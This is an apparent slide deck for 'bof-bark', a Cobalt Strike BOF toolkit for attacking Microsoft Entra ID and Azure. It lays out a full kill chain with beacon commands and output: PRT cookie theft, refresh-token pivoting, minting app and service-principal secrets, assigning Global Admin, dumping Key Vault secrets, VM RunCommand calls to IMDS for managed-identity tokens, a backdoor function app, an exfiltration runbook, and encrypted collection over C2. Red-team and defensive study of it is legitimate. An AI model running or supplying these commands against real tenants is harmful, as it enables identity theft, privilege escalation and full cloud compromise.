---
marp: true
theme: default
paginate: true
size: 16:9
color: "#e0e0e0"
backgroundColor: "#1a1a2e"
style: |
  section {
    font-family: 'Fira Code', 'Cascadia Code', monospace;
    font-size: 22px;
    padding: 40px 50px;
  }
  h1 {
    color: #00d4ff;
    font-size: 1.6em;
  }
  h2 {
    color: #00d4ff;
    font-size: 1.25em;
  }
  h3 {
    color: #00d4ff;
    font-size: 1.1em;
  }
  strong {
    color: #ff6b6b;
  }
  code {
    background: #16213e;
    color: #00ff88;
    font-size: 0.85em;
  }
  pre {
    background: #0f3460 !important;
    font-size: 0.82em;
    line-height: 1.35;
    padding: 12px 16px !important;
  }
  pre code {
    background: transparent;
    color: #00ff88;
  }
  a {
    color: #bb86fc;
  }
  table {
    font-size: 0.72em;
    width: 100%;
  }
  th {
    background: #16213e;
    color: #00d4ff;
    padding: 6px 10px;
  }
  td {
    background: #0f3460;
    color: #e0e0e0;
    padding: 5px 10px;
  }
  blockquote {
    border-left: 4px solid #ff6b6b;
    background: #16213e;
    color: #e0e0e0;
    padding: 0.4em 1em;
    font-size: 0.9em;
  }
  ul, ol {
    font-size: 0.95em;
    line-height: 1.5;
  }
  section.smaller {
    font-size: 19px;
  }
  section.smaller pre {
    font-size: 0.78em;
  }
  section.smallest {
    font-size: 17px;
  }
  section.smallest pre {
    font-size: 0.75em;
  }
---

# Entra ID & Azure RM Attack Paths

## From PRT Cookie to Domain Admin in the Cloud

**bof-bark** -- 151 BOFs for Cobalt Strike

---

# Agenda

1. **Azure Identity Architecture** -- Entra ID, Azure RM, the two planes
2. **OAuth2 Token Mechanics** -- resources, scopes, tokens, client IDs
3. **PRT Cookie Theft** -- the assumed initial access vector
4. **Token Acquisition & Pivoting** -- one token to rule them all
5. **Enumeration** -- mapping the tenant with BloodHound
6. **Common Attack Paths** -- privilege escalation chains
7. **Lateral Movement** -- cloud to on-prem and back
8. **OPSEC** -- diskless operation

---

# The Two Planes

Azure has **two distinct control surfaces**, each with its own API and permission model:

| | Entra ID (Identity Plane) | Azure RM (Resource Plane) |
|---|---|---|
| **API** | `graph.microsoft.com` | `management.azure.com` |
| **Controls** | Users, groups, apps, SPs, roles | Subscriptions, VMs, Key Vaults, ... |
| **Permissions** | App roles, directory roles | RBAC role assignments |
| **Legacy API** | `graph.windows.net` (AAD Graph) | -- |

An attacker needs **separate tokens** for each plane.
Compromise in one plane often enables pivot to the other.

---

<!-- _class: smaller -->

# OAuth2 Token Flow in Azure

```
                           +-------------------+
    User / Attacker        |  Azure AD / Entra |
         |                 |    (login.ms.com) |
         |  auth request   |                   |
         +---------------->|   resource:       |
         |  + client_id    |   graph.ms.com    |
         |  + resource     |   management.az   |
         |  + grant_type   |   vault.azure.net |
         |                 +-------------------+
         |                         |
         |    access_token         |
         |    refresh_token        |
         |<------------------------+
         |
         +--- access_token ------> [ MS Graph API ]
         +--- access_token ------> [ ARM API ]
         +--- access_token ------> [ Key Vault API ]
```

Each **resource** is a separate audience. One token per API.

---

# Key Concepts: Tokens

| Token | Lifetime | Purpose |
|---|---|---|
| **Access Token** | ~60-90 min | Bearer credential for a specific API |
| **Refresh Token** | ~90 days | Exchange for new access tokens (any resource) |
| **PRT** | Session-bound | SSO credential for the device, all resources |

**Refresh tokens are the crown jewels:**
- Long-lived, multi-resource
- One RT can mint access tokens for Graph, ARM, Key Vault, AAD Graph
- Stored in browser caches, token brokers, app state

---

<!-- _class: smaller -->

# Key Concepts: Client IDs

A **client ID** identifies the application requesting the token.
Azure pre-consents certain first-party apps for broad API access.

| Resource | Capability-ranked order |
|---|---|
| MS Graph | **Azure CLI** → AAD PowerShell → Teams → Office → Azure PowerShell → SharePoint |
| Legacy AAD Graph | **AAD PowerShell** → Azure CLI → Azure PowerShell → Office → Teams → SharePoint |
| ARM / Storage / Vault | **Azure CLI** → Azure PowerShell → AAD PowerShell → Office → Teams → SharePoint |
| Microsoft 365 services | **Office** → Teams → SharePoint → Azure CLI → Azure PowerShell → AAD PowerShell |

> BARK selects the order from the requested resource and still tries every
> known client before reporting authentication failure.

---

# What is a PRT?

The **Primary Refresh Token** is a device-bound SSO credential:

- Issued when a user signs in on a **domain-joined** or **Azure AD joined** device
- Stored in the **TPM** or **lsass** (CloudAP plugin)
- Automatically presented as a cookie (`x-ms-RefreshTokenCredential`) during browser SSO
- Grants access to **all Azure resources** the user can reach
- Contains device claims (compliance, hybrid join status)

**PRT = master key to the user's cloud identity from that device.**

---

<!-- _class: smaller -->

# PRT Cookie Theft -- The Attack

```
  Compromised Workstation (domain-joined)
  +-----------------------------------------+
  |                                         |
  |  1. Extract PRT cookie from browser     |
  |     - ROADtoken / RequestAADRefreshToken |
  |     - mimikatz cloudap                   |
  |     - BrowserCore.exe abuse              |
  |                                         |
  |  2. PRT cookie = x-ms-RefreshToken...   |
  |     (base64-encoded JWT, device-bound)  |
  |                                         |
  +-----------------------------------------+
              |
              v
  3. Use PRT cookie to obtain access tokens
     for any resource the user can access
```

The PRT cookie bypasses MFA because the device has already satisfied
the device-trust and MFA requirements at sign-in time.

---

<!-- _class: smaller -->

# PRT to Access Token with bof-bark

```
beacon> bark_get_token_with_prt_cookie <prt_cookie>
    https://graph.microsoft.com "" <tenantId>

[*] Trying 1/6: Microsoft Azure CLI (04b07795-...)...
[+] access_token: eyJ0eXAiOiJKV1Qi...
[+] refresh_token: 0.AXkA...
[+] client_id: 04b07795-... (Microsoft Azure CLI)
```

**What happened:**
1. BOF sends PRT cookie as `x-ms-RefreshTokenCredential` header
2. Drives an auth-code flow against `login.microsoftonline.com`
3. Exchanges the authorization code for access + refresh tokens
4. Auto-detects a working client ID (tries 6 first-party apps)

**You now have a refresh token -- pivot to any resource.**

---

<!-- _class: smaller -->

# Token Pivoting

One **refresh token** unlocks every API surface:

```
          Refresh Token (from PRT cookie)
                    |
        +-----------+-----------+
        |           |           |
        v           v           v
  MS Graph      ARM API     Key Vault
  token          token        token
```

```
beacon> bark_get_access_token_with_rt
    https://graph.microsoft.com "" <RT> <tenantId>

beacon> bark_get_access_token_with_rt
    https://management.azure.com "" <RT> <tenantId>

beacon> bark_get_access_token_with_rt
    https://vault.azure.net "" <RT> <tenantId>

beacon> bark_get_access_token_with_rt
    https://graph.windows.net "" <RT> <tenantId>
```

---

<!-- _class: smaller -->

# Token Scopes and What They Unlock

| Resource | Token scope | What you can enumerate/attack |
|---|---|---|
| MS Graph | `graph.microsoft.com` | Users, groups, apps, SPs, roles, devices, Intune |
| ARM | `management.azure.com` | Subscriptions, RGs, VMs, Key Vaults, Functions, AKS |
| Key Vault | `vault.azure.net` | Secrets, keys, certificates (data plane) |
| AAD Graph | `graph.windows.net` | Legacy Entra objects, Conditional Access Policies |
| Portal | Portal delegation | Portal-scoped operations, password resets |

Each BOF category maps to a token scope.
The umbrella collectors chain dozens of BOFs per scope:

```
beacon> bark_get_entra_info_bh    <graph_token>     # 15+ Entra BOFs
beacon> bark_get_azurerm_info_bh  <arm_token>       # 25+ ARM BOFs
```

---

# Phase 1: Entra ID Enumeration

With a **Graph token**, enumerate the identity plane:

```
beacon> bark_get_entra_info_bh <graph_token>
```

This chains: tenant info, users, groups, group members, group owners,
devices, device owners, roles, role assignments, apps, app owners,
app federated identity credentials, service principals, SP owners

**What to look for:**

- Users with **privileged roles** (Global Admin, App Admin, etc.)
- **App registrations** you own or can modify
- **Service principals** with excessive permissions
- **Group memberships** that grant elevated access
- **Federated identity credentials** on apps (external identity trust)
- **Devices** and their registered owners

---

# Phase 2: Azure RM Enumeration

With an **ARM token**, enumerate the resource plane:

```
beacon> bark_get_azurerm_info_bh <arm_token>
```

This chains: subscriptions, resource groups, resources, VMs, VMSS,
key vaults, storage accounts, logic/function/web apps, AKS, ACR,
automation accounts, Cosmos DB, role definitions + all role assignments

**What to look for:**

- **VMs** with managed identities (RunCommand pivot)
- **Key Vaults** with secrets, keys, certificates
- **Function Apps / Web Apps** you can modify
- **Automation Accounts** with runbooks
- **Role assignments** granting write/owner on resources
- **Managed identity assignments** across resource types

---

# Subscription Discovery Problem

The ARM `/subscriptions` endpoint requires **Reader RBAC at subscription scope**.

Tokens from PRT cookie / refresh token / ROPC often **lack this grant**,
even when the user can see subscriptions in the Azure Portal.

```
beacon> bark_get_all_azurerm_subscriptions <arm_token>
[*] GET /subscriptions?api-version=2022-12-01
{"value":[]}    <-- empty!
```

**bof-bark auto-fallback:** when `/subscriptions` returns empty, the BOF
transparently discovers subscriptions via the management group hierarchy:

1. `GET /providers/Microsoft.Management/managementGroups`
2. `GET .../managementGroups/{id}/descendants` (for each group)
3. Filter descendants where type = `microsoft.resources/subscriptions`
4. `GET /subscriptions/{id}` (for each discovered ID)

---

# BloodHound Integration

Every `*_bh` BOF emits BloodHound-compatible JSON:

```json
{
  "data": [
    {"kind": "AZUser", "data": { ... }},
    {"kind": "AZApp", "data": { ... }}
  ],
  "meta": {"type": "azure", "count": 42}
}
```

Import via **BloodHound CE** `Administration -> File Ingest`.

BloodHound then computes **attack paths** across:
- Entra role assignments
- App/SP ownership chains
- Azure RBAC role assignments
- Group membership transitivity
- Managed identity relationships

---

<!-- _class: smallest -->

# Attack Path 1: App Registration Owner

**Scenario:** You own (or can become owner of) an App Registration
that has an associated Service Principal with high privileges.

```
 You --[Owner]--> App Registration
                       |
           bark_new_entra_app_secret
                       |
                       v
               Client Credentials
               (appId + secret)
                       |
          bark_get_access_token_with_cc
                       |
                       v
              Service Principal
           (inherits app's permissions)
```

```
beacon> bark_new_entra_app_secret <graph_token> <appObjectId>
[+] New secret: Abc123...
[+] appId: 550e8400-...

beacon> bark_get_access_token_with_cc <tenantId>
    550e8400-... Abc123... https://graph.microsoft.com/.default
```

---

<!-- _class: smallest -->

# Attack Path 2: Service Principal Owner

**Scenario:** You own a Service Principal directly.

```
 You --[Owner]--> Service Principal
                       |
           bark_new_entra_sp_secret
                       |
                       v
              SP credentials
                       |
         bark_get_access_token_with_cc
                       |
                       v
         Act as the Service Principal
         (whatever permissions it has)
```

```
beacon> bark_new_entra_sp_secret <graph_token> <spObjectId>
[+] secretText: xYz789...

beacon> bark_get_access_token_with_cc <tenantId>
    <spAppId> xYz789... https://management.azure.com/.default
```

---

<!-- _class: smallest -->

# Attack Path 3: Group Membership Abuse

**Scenario:** You own a group or can add members to it.
The group has privileged role assignments or resource access.

```
 You --[Owner]--> Entra Group
                       |
       bark_add_member_to_entra_group
                       |
                       v
           Group has Azure RBAC
           "Contributor" on subscription
                       |
                       v
           You inherit Contributor
           on all resources in sub
```

```
beacon> bark_add_member_to_entra_group <graph_token>
    <yourObjectId> <targetGroupId>

beacon> bark_get_access_token_with_rt
    https://management.azure.com "" <RT> <tenantId>
```

Wait ~2 minutes for RBAC propagation.

---

<!-- _class: smaller -->

# Attack Path 4: Entra Role Escalation

**Scenario:** You can assign directory roles (e.g., you have
Privileged Role Administrator or Global Admin).

```
beacon> bark_get_all_entra_roles <graph_token>
  --> find role template IDs

beacon> bark_enable_entra_role <graph_token> <roleTemplateId>
  --> activate the role if not already enabled

beacon> bark_new_entra_role_assignment <graph_token>
    <targetPrincipalId> <roleDefinitionId>
  --> assign Global Admin / Application Admin / etc.
```

**High-value directory roles:**
- **Global Administrator** -- full tenant control
- **Application Administrator** -- manage all apps/SPs
- **Privileged Role Administrator** -- assign any role
- **Cloud Application Administrator** -- manage cloud apps
- **Exchange Administrator** -- mailbox access, mail flow rules

---

<!-- _class: smallest -->

# Attack Path 5: Key Vault Secret Extraction

**Scenario:** You have Key Vault data-plane access
(via RBAC or access policy).

```
beacon> bark_get_access_token_with_rt
    https://vault.azure.net "" <RT> <tenantId>

beacon> bark_get_azurerm_key_vault_secrets <kv_token>
    https://myvault.vault.azure.net
[+] SecretId: https://myvault.vault.azure.net/secrets/db-password
[+] SecretId: https://myvault.vault.azure.net/secrets/api-key

beacon> bark_get_azurerm_key_vault_secret_value <kv_token>
    https://myvault.vault.azure.net/secrets/db-password
[+] value: P@ssw0rd123!
```

Also enumerate: **keys**, **certificates**, **deleted certificates**
(recoverable via `bark_get_azurerm_key_vault_certificates_revival`).

---

<!-- _class: smaller -->

# Attack Path 6: VM RunCommand

**Scenario:** You have Contributor/Owner on a VM,
or `Microsoft.Compute/virtualMachines/runCommand/action`.

```
beacon> bark_invoke_azurerm_vm_run_command <arm_token>
    /subscriptions/.../virtualMachines/target-vm
    "whoami && curl -H 'Metadata:true'
     'http://169.254.169.254/metadata/identity/oauth2/token
     ?api-version=2018-02-01&resource=https://management.azure.com/'"
```

**The pivot chain:**
1. RunCommand executes as **SYSTEM** on the target VM
2. If the VM has a **managed identity**, query IMDS for its token
3. Use that token to access whatever the managed identity can reach
4. Managed identities often have **broad RBAC** on the subscription

Same pattern works for **VMSS VMs** and **AKS clusters**.

---

<!-- _class: smaller -->

# Attack Path 7: Function App Code Injection

**Scenario:** You have write access to a Function App.

```
beacon> bark_new_ps_function_app_function <arm_token>
    /subscriptions/.../sites/my-func-app
    backdoor
    "Invoke-RestMethod -Uri $env:IDENTITY_ENDPOINT
     -Headers @{X-IDENTITY-HEADER=$env:IDENTITY_HEADER}
     -Method GET"
```

The function runs with the **Function App's managed identity**.
Retrieve the token from the function's output:

```
beacon> bark_get_azure_function_output <arm_token>
    https://my-func-app.azurewebsites.net/api/backdoor
```

Same concept applies to **Web Apps** (shell command) and
**Logic Apps** (workflow manipulation).

---

# Attack Path 8: Automation Account Abuse

**Scenario:** You have Contributor on an Automation Account.

```
beacon> bark_new_azure_automation_account_runbook <arm_token>
    /subscriptions/.../automationAccounts/my-acct
    exfil-runbook
    "Get-AzAccessToken -ResourceUrl https://management.azure.com"

beacon> bark_start_azurerm_automation_account_runbook <arm_token>
    /subscriptions/.../automationAccounts/my-acct
    exfil-runbook ""
```

Runbooks execute with the **Automation Account's Run As account**
or **system-assigned managed identity**.

Also: read existing runbook source code, credential stores,
and job history for sensitive data.

---

<!-- _class: smaller -->

# Attack Path 9: Federated Identity Credentials

**Scenario:** An app has a federated identity credential trusting
an external identity provider (GitHub Actions, AWS, another tenant).

```
beacon> bark_get_entra_app_federated_identity_credentials
    <graph_token> <appObjectId>

[+] issuer: https://token.actions.githubusercontent.com
    subject: repo:org/repo:ref:refs/heads/main
    audience: api://AzureADTokenExchange
```

**If you control the trusted source** (the GitHub repo, the AWS account),
you can mint tokens that Azure accepts as proof of identity --
no client secret needed. This is a **secretless backdoor**.

Enumerate all apps' federated credentials with `bark_get_entra_info_bh`.

---

<!-- _class: smaller -->

# Attack Path 10: Conditional Access Bypass

**Scenario:** MFA policies have exclusions you can exploit.

```
beacon> bark_get_conditional_access_policies <aadgraph_token>
```

The BOF analyzes every CA policy and reports:

- **User exclusions** -- users/groups exempt from MFA entirely
- **App exclusions** -- apps where MFA is not enforced
- **Platform exclusions** -- Android/iOS bypasses
- **Location exclusions** -- trusted network exemptions
- **Device compliance exclusions**

Output: BloodHound graph JSON mapping each affected principal
to their specific MFA bypass opportunities.

> Uses the legacy AAD Graph internal API -- requires
> `https://graph.windows.net/` scoped token.

---

<!-- _class: smallest -->

# The Full Kill Chain

```
  PRT Cookie Theft (compromised workstation)
        |
        v
  bark_get_token_with_prt_cookie  -->  refresh_token
        |
        +----> Graph token ---> Entra enumeration (BH ingest)
        |                          |
        |                    Identify: app owners,
        |                    group owners, role holders
        |                          |
        +----> ARM token ----> Azure RM enumeration (BH ingest)
        |                          |
        |                    Identify: VMs, Key Vaults,
        |                    Functions, managed identities
        |                          |
        v                          v
  Privilege Escalation:      Lateral Movement:
  - Add app/SP secrets      - VM RunCommand -> MI token
  - Assign roles             - Function injection -> MI token
  - Join privileged groups   - Key Vault secret extraction
  - RBAC role assignment     - Automation runbook execution
        |                          |
        +------------+-------------+
                     |
                     v
          Full tenant compromise
```

---

# OPSEC: Diskless Operation

All `*_bh` BOFs use **download mode by default** -- no files written to disk:

```
beacon> bark_get_entra_info_bh <graph_token>
[+] Downloaded AZUser_20250621_143022.json (28 KB)
[+] Downloaded AZGroup_20250621_143025.json (12 KB)
...
```

Files appear in the **teamserver's Downloads tab**, not on the target.

**Password-protected ZIP collection** bundles and encrypts output:

```
beacon> bark_download_mode off
beacon> bark_get_entra_info_bh <graph_token> MyPassword!
[+] Downloaded bark_collect_20250621_143500.zip
```

Mode OFF permits temporary JSON staging. Original JSON files are deleted after
ZIP creation, and the encrypted archive is delivered through C2.

---

<!-- _class: smaller -->

# OPSEC: Token Hygiene

**Token inspection** before use:

```
beacon> bark_parse_jwt_token <token>
[+] Header: {"typ":"JWT","alg":"RS256"}
[+] Payload:
    aud: https://graph.microsoft.com
    iss: https://sts.windows.net/<tenantId>/
    upn: user@contoso.com
    exp: 1719000000  (remaining: 42 min)
    scp: User.Read Directory.Read.All
```

**Considerations:**
- Access tokens expire in ~60-90 min -- refresh frequently
- Each API call generates **audit logs** in Azure AD / Azure Monitor
- Use the **narrowest client ID** that works for your objective
- Prefer **Azure CLI** client ID for ARM (broadest consent)
- Conditional Access policies may block non-compliant device claims

---

<!-- _class: smallest -->

# Recommended Workflow

```
 PRT cookie / refresh token
             |
             v
 bark_get_all_info_bh_rt
             |
             v
 Resource-aware client ID ranking
             |
             v
      MS Graph auth + collection
        /                 \
   succeeds          auth/request fails
      |                    |
      v                    v
 MS Graph identity    Legacy AAD Graph
 + AAD Graph CA       identity + CA fallback
        \                 /
         v               v
       Azure RM BloodHound collection
                   |
                   v
       Storage + Key Vault probes
                   |
                   v
       C2 downloads or encrypted ZIP
                   |
                   v
          Import into BloodHound CE
```

---

<!-- _class: smaller -->

# Summary

| Phase | BOFs | Token |
|---|---|---|
| **Initial Access** | `get_token_with_prt_cookie` | PRT cookie |
| **Token Pivot** | `get_access_token_with_rt` | Refresh token |
| **Entra Recon** | `get_entra_info_bh` (15+ BOFs) | Graph |
| **ARM Recon** | `get_azurerm_info_bh` (25+ BOFs) | ARM |
| **CA Analysis** | `get_conditional_access_policies` | AAD Graph |
| **Priv Esc** | `new_entra_*_secret`, `new_*_role_*` | Graph / ARM |
| **Lateral Move** | `invoke_*_run_command`, `new_*_function` | ARM |
| **Data Access** | `get_azurerm_key_vault_secret*` | Key Vault |
| **Collection** | `zip_collect`, `download_mode` | -- |

**151 BOFs** covering the full Entra ID + Azure RM attack lifecycle.

---

# References

- [BARK / BARKKAI](https://github.com/whal3b0n3/BARKKAI) -- PowerShell source
- [BloodHound CE](https://github.com/BloodHoundAD/BloodHound) -- attack path analysis
- [AzureHound](https://github.com/BloodHoundAD/AzureHound) -- Azure data collector
- [ROADtools](https://github.com/dirkjanm/ROADtools) -- Azure AD exploration
- [Microsoft identity platform](https://learn.microsoft.com/en-us/entra/identity-platform/) -- OAuth2 docs
- [Azure RBAC](https://learn.microsoft.com/en-us/azure/role-based-access-control/) -- role-based access control
